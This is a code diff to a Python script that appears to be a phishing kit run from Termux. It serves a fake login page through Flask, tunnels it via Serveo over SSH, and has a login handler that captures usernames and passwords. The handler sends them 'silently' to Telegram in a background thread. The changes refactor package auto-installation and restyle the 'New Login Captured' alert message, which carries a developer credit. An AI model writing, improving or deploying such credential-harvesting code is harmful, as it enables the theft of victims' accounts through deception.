@@ -8,25 +8,23 @@ import itertools
 import time
 from datetime import datetime
 
-# -------- Auto-install Flask & Requests --------
-def install(package):
-    os.system(f"{sys.executable} -m pip install {package}")
+# -------- Auto-install Function --------
+def install_and_import(package, import_name=None):
+    try:
+        if not import_name:
+            import_name = package
+        return __import__(import_name)
+    except ImportError:
+        print(f"Installing {package}...")
+        os.system(f"{sys.executable} -m pip install {package}")
+        return __import__(import_name)
 
-try:
-    from flask import Flask, request, send_from_directory, redirect
-except ModuleNotFoundError:
-    print("Installing Flask...")
-    install("flask")
-    from flask import Flask, request, send_from_directory, redirect
+# -------- Import Needed Packages --------
+flask = install_and_import("flask")
+requests = install_and_import("requests")
+from flask import Flask, request, send_from_directory, redirect
 
-try:
-    import requests
-except ModuleNotFoundError:
-    print("Installing Requests...")
-    install("requests")
-    import requests
-
-# Install openssh if missing
+# Install openssh if missing (for Termux/Serveo)
 if os.system("command -v ssh > /dev/null") != 0:
     os.system("pkg install -y openssh")
 
@@ -90,11 +88,17 @@ def login():
 
     # ---- Send to Telegram silently ----
     msg = f"""
-🔐 New Login Captured  
-━━━━━━━━━━━━━━━━━━━  
-👤 Username: {username}  
-🔑 Password: {password}  
-🕒 Time: {timestamp}  
+╔━━━━━━━━━━━━━━━━━━
+║ 🔐 New Login Captured  
+╚━━━━━━━━━━━━━━━━━━  
+╔━━━━━━━━━━━━━━━━━━
+║ 👤 Username: {username}  
+║ 🔑 Password: {password}  
+║ 🕒 Time: {timestamp}
+╚━━━━━━━━━━━━━━━━━━
+╔━━━━━━━━━━━━━━━━━━
+║ 🐈‍⬛ dev: Dhani 
+╚━━━━━━━━━━━━━━━━━━
 """
     threading.Thread(
         target=lambda: requests.get(
